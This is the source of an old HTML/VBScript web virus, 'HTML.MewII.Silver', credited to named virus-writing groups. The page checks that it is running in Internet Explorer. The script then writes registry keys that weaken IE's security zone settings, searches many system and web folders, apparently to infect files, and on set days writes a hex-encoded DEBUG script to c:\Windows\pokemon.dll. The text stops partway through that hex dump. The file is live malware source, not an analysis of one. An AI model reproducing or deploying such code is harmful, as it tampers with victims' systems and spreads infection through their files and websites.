<!--MewII Silver-->
<HTML>
<BODY>
<SCRIPT Language = "JavaScript">
<!--
	var userAgent=navigator.appName;
	var agentInfo=userAgent.substring(0, 1);
    if(agentInfo == "M"){
}
else {
alert("The page you want to view was designed for Internet Explorer only, \n Please view this page with Internet Explorer")
self.close()
}
//-->
</SCRIPT>
<Script Language = "VBScript">
<!--
On Error Resume Next
'HTML.MewII.Silver
'By -KD- [Metaphase VX Team & NoMercyVirusTeam]
'Technology used from foxz [NoMercyVirusTeam]
'Specal Thanks to Evul for help with Win32.Joke.MewII
'Part of the HTML Pokemon Family
'This Family goes out to IDT
Set WSHShell = CreateObject("WScript.Shell")
WSHShell.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
WSHShell.Regwrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
If location.protocol = "file:" then
  Randomize
  Set FSO = CreateObject("Scripting.FileSystemObject")
  Set TRange = document.body.createTextRange
  HPath = Replace(location.href, "/", "\")
  HPath = Replace(HPath, "file:\\\", "")
  HPath = FSO.GetParentFolderName(HPath)
  Call GetFolder(HPath)
  Call GetFolder("C:\")
  Call GetFolder("C:\My Documents")
  Call GetFolder("C:\Windows")
  Call GetFolder("C:\Windows\System")
  Call GetFolder("C:\Windows\ShellNew")
  Call GetFolder("C:\Windows\Help")
  Call GetFolder("C:\Windows\Temp")
  Call GetFolder("C:\Windows\Web")
  Call GetFolder("C:\Windows\Web\Wallpaper")
  Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
  Call GetFolder("C:\Inetpub\wwwroot")
  Call GetFolder("C:\Inetpub\wwwroot\myweb")
  Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
  Call GetFolder("C:\Program Files\Microsoft FrontPage\bin")
End If
If Day(Now()) = 5 or Day(Now()) = 15 or Day(Now()) = 20  Then
  Set DropMewSilver = FSO.CreateTextFile("c:\Windows\pokemon.dll", 2, False)
  DropMewSilver.WriteLine "n mew2.jpg"
  DropMewSilver.WriteLine "e 0100 ff d8 ff e0 00 10 4a 46 49 46 00 01 01 01 00 60 "
  DropMewSilver.WriteLine "e 0110 00 60 00 00 ff fe 00 17 43 72 65 61 74 65 64 20 "
  DropMewSilver.WriteLine "e 0120 77 69 74 68 20 54 68 65 20 47 49 4d 50 ff db 00 "
  DropMewSilver.WriteLine "e 0130 43 00 08 06 06 07 06 05 08 07 07 07 09 09 08 0a "
  DropMewSilver.WriteLine "e 0140 0c 14 0d 0c 0b 0b 0c 19 12 13 0f 14 1d 1a 1f 1e "
  DropMewSilver.WriteLine "e 0150 1d 1a 1c 1c 20 24 2e 27 20 22 2c 23 1c 1c 28 37 "
  DropMewSilver.WriteLine "e 0160 29 2c 30 31 34 34 34 1f 27 39 3d 38 32 3c 2e 33 "
  DropMewSilver.WriteLine "e 0170 34 32 ff db 00 43 01 09 09 09 0c 0b 0c 18 0d 0d "
  DropMewSilver.WriteLine "e 0180 18 32 21 1c 21 32 32 32 32 32 32 32 32 32 32 32 "
  DropMewSilver.WriteLine "e 0190 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 "
  DropMewSilver.WriteLine "e 01a0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 "
  DropMewSilver.WriteLine "e 01b0 32 32 32 32 32 32 32 ff c0 00 11 08 00 6f 00 50 "
  DropMewSilver.WriteLine "e 01c0 03 01 22 00 02 11 01 03 11 01 ff c4 00 1b 00 00 "
  DropMewSilver.WriteLine "e 01d0 02 03 01 01 01 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewSilver.WriteLine "e 01e0 06 04 05 07 03 02 01 ff c4 00 37 10 00 01 03 03 "
  DropMewSilver.WriteLine "e 01f0 02 04 04 04 04 05 05 01 00 00 00 00 01 02 03 04 "
  DropMewSilver.WriteLine "e 0200 00 05 11 06 21 12 13 31 41 51 61 71 81 07 22 91 "
  DropMewSilver.WriteLine "e 0210 c1 14 42 a1 f0 23 33 b1 d1 e1 15 24 32 43 52 b2 "
  DropMewSilver.WriteLine "e 0220 ff c4 00 18 01 00 03 01 01 00 00 00 00 00 00 00 "
  DropMewSilver.WriteLine "e 0230 00 00 00 00 00 00 02 03 01 04 ff c4 00 1f 11 00 "
  DropMewSilver.WriteLine "e 0240 03 01 01 00 03 00 03 01 00 00 00 00 00 00 00 00 "
  DropMewSilver.WriteLine "e 0250 01 02 11 21 03 12 31 22 41 61 91 ff da 00 0c 03 "
  DropMewSilver.WriteLine "e 0260 01 00 02 11 03 11 00 3f 00 df ea 05 ee 53 90 ac "
  DropMewSilver.WriteLine "e 0270 57 09 4d 03 cc 66 3b 8b 46 07 70 92 45 4f af 0f "
  DropMewSilver.WriteLine "e 0280 34 87 d9 71 a7 12 14 da d2 52 a4 9e e0 8c 11 40 "
  DropMewSilver.WriteLine "e 0290 08 96 1b ab c8 10 de 4b ab 77 9e a4 25 cc e4 f1 "
  DropMewSilver.WriteLine "e 02a0 71 10 3e f9 a7 e1 d2 b2 26 4c bd 0b 7f 10 e6 21 "
  DropMewSilver.WriteLine "e 02b0 46 09 59 31 64 2b a2 93 e0 4f 88 1b 11 5a 5d ba "
  DropMewSilver.WriteLine "e 02c0 f5 0a e2 ca 54 cb c8 e2 23 fe 05 43 35 7f 2a dc "
  DropMewSilver.WriteLine "e 02d0 a4 75 79 d7 b2 57 2b 87 4b a4 f1 02 12 9d 18 2b "
  DropMewSilver.WriteLine "e 02e0 2a 08 40 f1 24 fd b7 3e d5 29 97 39 ac a1 ce 9c "
  DropMewSilver.WriteLine "e 02f0 40 1a 52 ba 3e 89 ba 56 2c a4 bc 16 a6 e5 24 9c "
  DropMewSilver.WriteLine "e 0300 64 7c c5 45 24 1f 4e 23 f4 a6 04 bc 88 b1 23 17 "
  DropMewSilver.WriteLine "e 0310 5c 09 e2 58 00 a8 e3 b1 fb 0a 87 ec e7 ce 16 34 "
  DropMewSilver.WriteLine "e 0320 51 45 02 85 14 51 40 05 14 57 95 ad 0d a4 a9 6a "
  DropMewSilver.WriteLine "e 0330 09 03 a9 3b 50 04 79 f6 e8 77 48 aa 8b 3a 33 72 "
  DropMewSilver.WriteLine "e 0340 18 56 e5 0e 27 23 3e 3e 47 ce 91 ae 9f 0c 94 95 "
  DropMewSilver.WriteLine "e 0350 a9 fb 0d dd e8 4a ea 18 74 73 1b 1e 87 a8 fd 69 "
  DropMewSilver.WriteLine "e 0360 c1 db f5 bd b5 14 89 09 59 07 1f 29 1d 6b b2 26 "
  DropMewSilver.WriteLine "e 0370 35 31 85 04 71 25 2a 49 1c 44 56 cd b5 f1 8f 3e "
  DropMewSilver.WriteLine "e 0380 f3 d4 66 5c 72 da 2c 34 95 a7 f0 32 43 2b e0 ef "
  DropMewSilver.WriteLine "e 0390 cc 4a 37 3e 87 03 de 98 64 da 1c 72 ee 2f 53 dd "
  DropMewSilver.WriteLine "e 03a0 e7 db e3 c7 0e 32 c2 89 21 0b 4a 37 25 3f a8 ac "
  DropMewSilver.WriteLine "e 03b0 e2 c3 76 5c ab 8a a3 cb 51 43 ac b9 84 36 a3 d0 "
  DropMewSilver.WriteLine "e 03c0 61 5b 81 ed 8f 7a 7f b9 6a 74 46 91 67 b1 b7 fc "
  DropMewSilver.WriteLine "e 03d0 57 a6 60 49 48 df 96 ce 37 27 c3 a6 3d 8d 0a 9a "
  DropMewSilver.WriteLine "e 03e0 fa 3f d4 31 69 dd 55 07 50 46 0b 61 69 0a ce 31 "
  DropMewSilver.WriteLine "e 03f0 9e ff 00 6a bf ac ae c9 a3 25 d9 f5 0c 87 ed 52 "
  DropMewSilver.WriteLine "e 0400 d0 ab 6a c7 c8 85 95 73 00 ea 33 b6 36 3d eb 4b "
  DropMewSilver.WriteLine "e 0410 8e f9 e5 20 3e 38 5d c7 cd b6 d9 a6 bf 5f b2 1e "
  DropMewSilver.WriteLine "e 0420 48 4b 1a ff 00 09 34 50 0e 68 a4 22 2f ea 0d 42 "
  DropMewSilver.WriteLine "e 0430 9b 72 c4 38 e4 19 4a 48 5a 89 1b 36 9c e3 3e a7 "
  DropMewSilver.WriteLine "e 0440 b0 f2 26 96 6f 2f 4b bb b4 cd b1 88 2e c9 5b df "
  DropMewSilver.WriteLine "e 0450 f6 89 1c b0 15 e2 77 f0 f2 a5 58 97 27 af 37 d9 "
  DropMewSilver.WriteLine "e 0460 f3 9d 04 12 ea 88 19 e8 9c e1 23 d8 01 f4 a7 9d "
  DropMewSilver.WriteLine "e 0470 24 da e4 5c 94 f6 08 6d 94 6f b7 e6 3b 0f d3 34 "
  DropMewSilver.WriteLine "e 0480 f3 39 f9 32 8b 14 8a 92 b4 16 a5 b6 43 0f b4 b6 "
  DropMewSilver.WriteLine "e 0490 a6 03 fc d8 c8 59 24 0f 22 40 cd 4b b1 6a 17 ed "
  DropMewSilver.WriteLine "e 04a0 ca 53 12 60 dd 13 83 94 b4 e3 6b c6 73 83 b7 7a "
  DropMewSilver.WriteLine "e 04b0 d5 e9 3b e2 35 f1 eb 3d 85 2d b1 94 aa 52 8b 7c "
  DropMewSilver.WriteLine "e 04c0 63 b0 c6 71 ef d3 d3 34 7b 6f 04 4d 98 ee a9 8a "
  DropMewSilver.WriteLine "e 04d0 fa 2f 8b ba c3 8c fc 3e 62 f9 8d 15 b6 51 d7 7d "
  DropMewSilver.WriteLine "e 04e0 b3 eb 56 56 25 3c c9 95 3d 71 9e 99 35 dc f3 96 "
  DropMewSilver.WriteLine "e 04f0 10 55 cb 40 dc 8d bf 7f 4a ba b6 ea 56 b5 45 85 "
  DropMewSilver.WriteLine "e 0500 56 2b ab 8d c5 9c 85 66 34 85 9c a1 4a 1d 89 1e "
  DropMewSilver.WriteLine "e 0510 3b 8f 7a f9 17 58 a6 d4 fb 31 e0 46 42 99 07 81 "
  DropMewSilver.WriteLine "e 0520 c7 10 80 94 93 dc fe fe b5 8d 7f 07 9c dd 3b 5b "
  DropMewSilver.WriteLine "e 0530 f5 82 62 f3 0b 48 96 fa d4 90 10 8e 22 50 9c 78 "
  DropMewSilver.WriteLine "e 0540 ff 00 63 56 05 5a b2 74 56 2f 0c 47 12 62 39 95 "
  DropMewSilver.WriteLine "e 0550 16 1b 7b 85 c2 01 c7 43 db d0 e6 a9 af 12 19 9b "
  DropMewSilver.WriteLine "e 0560 74 8f 0a d2 a0 b5 4f 20 a1 23 f2 12 70 41 f7 ad "
  DropMewSilver.WriteLine "e 0570 86 dd 09 bb 75 ba 3c 36 c7 c8 cb 61 03 cf 1d ea "
  DropMewSilver.WriteLine "e 0580 94 a6 52 68 a7 93 21 2c 7d 16 f4 d6 a5 6e eb 21 "
  DropMewSilver.WriteLine "e 0590 51 02 56 c3 e9 6c 2d 2d 29 59 c6 3a a7 d4 7f 7a "
  DropMewSilver.WriteLine "e 05a0 6a 65 d0 ea 33 d1 40 e0 8f 03 59 25 cc 39 a6 b5 "
  DropMewSilver.WriteLine "e 05b0 bc a9 2d 23 25 2e 97 91 e1 c0 ad f1 e9 be 2b 45 "
  DropMewSilver.WriteLine "e 05c0 72 ec 80 98 53 62 a5 b7 23 49 c1 71 45 78 28 49 "
  DropMewSilver.WriteLine "e 05d0 1d 71 83 9d f0 08 da a6 d6 74 8e 68 99 76 d1 f3 "
  DropMewSilver.WriteLine "e 05e0 a0 6a 57 64 c0 65 6b b7 4c 51 71 ce 4a 42 96 d2 "
  DropMewSilver.WriteLine "e 05f0 fa 9f 94 e3 63 be 37 ef f5 75 d3 d6 d7 6d f0 bf "
  DropMewSilver.WriteLine "e 0600 8b c2 95 b9 82 50 94 e3 1e bb 9d ff 00 41 57 14 "
  DropMewSilver.WriteLine "e 0610 50 e9 b5 86 6f 30 29 33 e2 81 40 d1 4f 25 4c 73 "
  DropMewSilver.WriteLine "e 0620 56 b7 9b 43 40 75 4a 8a b6 23 cf af d6 9c e9 56 "
  DropMewSilver.WriteLine "e 0630 e9 72 6e 6d e0 42 09 4a 9a 8a a0 54 48 ce 5c ff "
  DropMewSilver.WriteLine "e 0640 00 1f d6 89 5a f8 6c ad 78 62 96 8b 43 f3 24 94 "
  DropMewSilver.WriteLine "e 0650 ad b0 cf 29 c2 d3 a5 60 e1 2b 1f 97 1d 73 e5 eb "
  DropMewSilver.WriteLine "e 0660 53 67 5a 2e 96 d9 e2 d5 1e 38 5a df 5f 02 38 06 "
  DropMewSilver.WriteLine "e 0670 52 b2 7a 81 9e 87 c4 55 ae a3 9a b5 6a 19 2e c5 "
  DropMewSilver.WriteLine "e 0680 4a 52 94 3e a2 f7 2c 75 c7 0a 78 88 f2 e1 19 fa "
  DropMewSilver.WriteLine "e 0690 d3 b5 bd 65 c9 6d 5c a7 b5 c2 fa 9d 1f 87 ce c7 "
  DropMewSilver.WriteLine "e 06a0 84 8d d5 8f 31 fb de b5 ba 4c a2 84 f8 8a df 86 "
  DropMewSilver.WriteLine "e 06b0 3a 41 c8 f8 bf dc 5b 52 5f 50 28 8c d2 c6 38 13 "
  DropMewSilver.WriteLine "e 06c0 d0 a8 8f 13 db cb 3e 35 a7 d7 84 28 10 08 e8 7a "
  DropMewSilver.WriteLine "e 06d0 57 ba 56 f5 92 6f 58 a3 ab f4 fc ab 8a d3 32 24 "
  DropMewSilver.WriteLine "e 06e0 56 65 ad 0d f2 cb 0b 59 6d 44 64 9c 85 03 8e fd "
  DropMewSilver.WriteLine "e 06f0 0d 56 69 bd 2b 76 4c 86 bf d5 4f 2a 0b 43 89 b8 "
  DropMewSilver.WriteLine "e 0700 e9 50 cf 16 49 c2 b1 9d bd eb 41 a2 8d e6 02 6d "
  DropMewSilver.WriteLine "e 0710 05 14 51 58 61 16 e7 2f f0 16 b9 72 f1 9e 43 2b "
  DropMewSilver.WriteLine "e 0720 73 1e 38 04 d6 67 a7 64 97 50 1d 71 59 5a f2 a5 "
  DropMewSilver.WriteLine "e 0730 2b c4 9d c9 a7 7d 6e fa a3 68 cb a3 89 